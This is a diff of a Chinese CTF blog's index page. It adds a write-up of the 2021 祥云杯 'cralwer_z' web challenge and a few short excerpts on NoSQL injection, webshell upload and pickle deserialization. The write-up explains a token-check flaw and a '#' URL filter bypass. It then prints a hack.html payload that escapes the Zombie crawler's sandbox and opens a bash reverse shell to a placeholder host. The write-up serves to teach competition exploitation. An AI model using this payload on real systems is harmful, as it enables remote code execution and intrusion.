@@ -157,6 +157,263 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/09/01/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-cralwer-z/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nappingCat">
+      <meta itemprop="description" content="2571374157@qq.com">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="nappingCat's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/09/01/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-cralwer-z/" class="post-title-link" itemprop="url">(2021祥云杯)cralwer_z</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-09-01 22:24:37 / Modified: 23:15:44" itemprop="dateCreated datePublished" datetime="2021-09-01T22:24:37+08:00">2021-09-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">web刷题记录</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>给了源码，正常注册，登录后进入路由<code>/user</code></p>
+<p><code>/profile</code>用于展示和更改User信息，可以更改<code>User.bucket</code>，但这里是初步更改</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> User.update(&#123;</span><br><span class="line">            affiliation,</span><br><span class="line">            age,</span><br><span class="line">            personalBucket: bucket</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
+<p>这里并没有直接更改User的bucket信息，而是先存放在<code>personalBucket</code>中，后面更改的时候还要验证一下token</p>
+<p>这里正常更改的话会有过滤，必须符合正则匹配</p>
+<p><code>/^https:\/\/[a-f0-9]&#123;32&#125;\.oss-cn-beijing\.ichunqiu\.com\/$/</code></p>
+<p>但可以通过其他方式，先更改personalBucket，这时候肯定是不符合正则的，程序就不会进行跳转更改，但我们可以自己拿token在verify路由下更改，主要是token要符合要求</p>
+<p><code>/verify</code>可以说才是真正更改<code>bucket</code>的地方，看一下代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/verify&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; token &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (!token || <span class="keyword">typeof</span> (token) !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&quot;Parameters error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> Token.findOne(&#123;</span><br><span class="line">        token,</span><br><span class="line">        userId: req.session.userId,</span><br><span class="line">        valid: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> Token.update(&#123;</span><br><span class="line">                valid: <span class="literal">false</span></span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">await</span> User.update(&#123;</span><br><span class="line">                bucket: user.personalBucket</span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">            <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">message</span>: <span class="string">&quot;Successfully update your bucket from personal bucket!&quot;</span> &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            next(createError(<span class="number">500</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">message</span>: <span class="string">&quot;Failed to update, check your token carefully&quot;</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>上面验证token应该是出现了非预期</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const result &#x3D; await Token.findOne(&#123;</span><br><span class="line">        token,</span><br><span class="line">        userId: req.session.userId,</span><br><span class="line">        valid: true</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+<p><code>token</code>应该为<code>token:token</code></p>
+<p>导致只要token存在就可以，<code>valid</code>就无关紧要了</p>
+<p>所以现在可以不受限制更改bucket，步骤是，先提交符合要求的bucket拿到有效token，然后提交不符合要求的bucket，也就是目标bucket，这样User中的personalBucket就是目标bucket，然后访问<code>/user/verify?token=xxx</code>，就可以更改bucket了</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>利用zombie进行RCE</p>
+<p>路由<code>/user/bucket</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">router.get(&#39;&#x2F;bucket&#39;, async (req, res) &#x3D;&gt; &#123;</span><br><span class="line">    const user &#x3D; await User.findByPk(req.session.userId);</span><br><span class="line">    if (&#x2F;^https:\&#x2F;\&#x2F;[a-f0-9]&#123;32&#125;\.oss-cn-beijing\.ichunqiu\.com\&#x2F;$&#x2F;.exec(user.bucket)) &#123;</span><br><span class="line">        return res.json(&#123; message: &quot;Sorry but our remote oss server is under maintenance&quot; &#125;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F; Should be a private site for Admin</span><br><span class="line">        try &#123;</span><br><span class="line">            const page &#x3D; new Crawler(&#123;</span><br><span class="line">                userAgent: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.212 Safari&#x2F;537.36&#39;,</span><br><span class="line">                referrer: &#39;https:&#x2F;&#x2F;www.ichunqiu.com&#x2F;&#39;,</span><br><span class="line">                waitDuration: &#39;3s&#39;</span><br><span class="line">            &#125;);</span><br><span class="line">            await page.goto(user.bucket);</span><br><span class="line">            const html &#x3D; page.htmlContent;</span><br><span class="line">            const headers &#x3D; page.headers;</span><br><span class="line">            const cookies &#x3D; page.cookies;</span><br><span class="line">            await page.close();</span><br><span class="line"></span><br><span class="line">            return res.json(&#123; html, headers, cookies&#125;);</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            return res.json(&#123; err: &#39;Error visiting your bucket. &#39; &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p><code>Crawler</code>爬虫使用<code>Zombie</code>实现，而这个模块是有漏洞的，参考</p>
+<p><a target="_blank" rel="noopener" href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a></p>
+<p>更改bucket还要绕过一个简单的过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static checkBucket(url) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            url &#x3D; new URL(url);</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (url.protocol !&#x3D; &quot;http:&quot; &amp;&amp; url.protocol !&#x3D; &quot;https:&quot;) return false;</span><br><span class="line">        if (url.href.includes(&#39;oss-cn-beijing.ichunqiu.com&#39;) &#x3D;&#x3D;&#x3D; false) return false;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>用#绕过就可以了</p>
+<p>提交bucket为<code>http://vps ip:port/hack.html#oss-cn-beijing.ichunqiu.com</code></p>
+<p>在vps上开一个http服务，放置<code>hack.html</code></p>
+<p>内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;c&#x3D;&#39;constructor&#39;;this[c][c](&quot;c&#x3D;&#39;constructor&#39;;require&#x3D;this[c][c](&#39;return process&#39;)().mainModule.require;var sync&#x3D;require(&#39;child_process&#39;).spawnSync; var ls &#x3D; sync(&#39;bash&#39;, [&#39;-c&#39;,&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;x 0&gt;&amp;1&#39;],);console.log(ls.output.toString());&quot;)()&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>再次访问<code>/user/bucket</code>即可拿到shell</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/08/18/GKCTF-2021-hackme/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nappingCat">
+      <meta itemprop="description" content="2571374157@qq.com">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="nappingCat's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/08/18/GKCTF-2021-hackme/" class="post-title-link" itemprop="url">(GKCTF 2021)hackme</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-08-18 23:02:19" itemprop="dateCreated datePublished" datetime="2021-08-18T23:02:19+08:00">2021-08-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-08-28 22:54:22" itemprop="dateModified" datetime="2021-08-28T22:54:22+08:00">2021-08-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">web刷题记录</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="0x01-nosql注入"><a href="#0x01-nosql注入" class="headerlink" title="0x01 nosql注入"></a>0x01 nosql注入</h3><p>前台提示nosql</p>
+<p>利用重言式注入，发现存在过滤</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/08/18/GKCTF-2021-hackme/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nappingCat">
+      <meta itemprop="description" content="2571374157@qq.com">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="nappingCat's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">GKCTFxDASCTF web部分复现</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-08-09 17:24:33" itemprop="dateCreated datePublished" datetime="2021-08-09T17:24:33+08:00">2021-08-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-08-28 22:54:46" itemprop="dateModified" datetime="2021-08-28T22:54:46+08:00">2021-08-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">web刷题记录</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="0x01-babycat"><a href="#0x01-babycat" class="headerlink" title="0x01 babycat"></a>0x01 babycat</h3><p>这题出了非预期，非预期就直接传马，没有任何过滤</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -708,249 +965,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/07/24/HFCTF-2021-Final-easyflask/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="nappingCat">
-      <meta itemprop="description" content="2571374157@qq.com">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="nappingCat's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/07/24/HFCTF-2021-Final-easyflask/" class="post-title-link" itemprop="url">(HFCTF 2021 Final)easyflask</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-07-24 23:57:00" itemprop="dateCreated datePublished" datetime="2021-07-24T23:57:00+08:00">2021-07-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-07-25 00:04:26" itemprop="dateModified" datetime="2021-07-25T00:04:26+08:00">2021-07-25</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">web刷题记录</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="0x01-源码"><a href="#0x01-源码" class="headerlink" title="0x01 源码"></a>0x01 源码</h3><p><code>/file?file=/app/source</code></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/07/24/HFCTF-2021-Final-easyflask/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/07/24/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="nappingCat">
-      <meta itemprop="description" content="2571374157@qq.com">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="nappingCat's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/07/24/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">pickle 反序列化</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-07-24 18:56:09" itemprop="dateCreated datePublished" datetime="2021-07-24T18:56:09+08:00">2021-07-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-07-25 00:04:58" itemprop="dateModified" datetime="2021-07-25T00:04:58+08:00">2021-07-25</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="0x01-pickle"><a href="#0x01-pickle" class="headerlink" title="0x01 pickle"></a>0x01 pickle</h3><p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 <code>PVM（Pickle Virtual Machine）</code>，包含三大部分</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/07/24/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/07/23/flask-session%E9%97%AE%E9%A2%98/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="nappingCat">
-      <meta itemprop="description" content="2571374157@qq.com">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="nappingCat's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/07/23/flask-session%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">flask session问题</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-07-23 23:14:08" itemprop="dateCreated datePublished" datetime="2021-07-23T23:14:08+08:00">2021-07-23</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-07-25 00:05:16" itemprop="dateModified" datetime="2021-07-25T00:05:16+08:00">2021-07-25</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="0x01-flask-session篡改"><a href="#0x01-flask-session篡改" class="headerlink" title="0x01 flask session篡改"></a>0x01 flask session篡改</h3>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/07/23/flask-session%E9%97%AE%E9%A2%98/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1020,7 +1034,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-count">39</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1033,7 +1047,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">46</span>
+        <span class="site-state-item-count">50</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
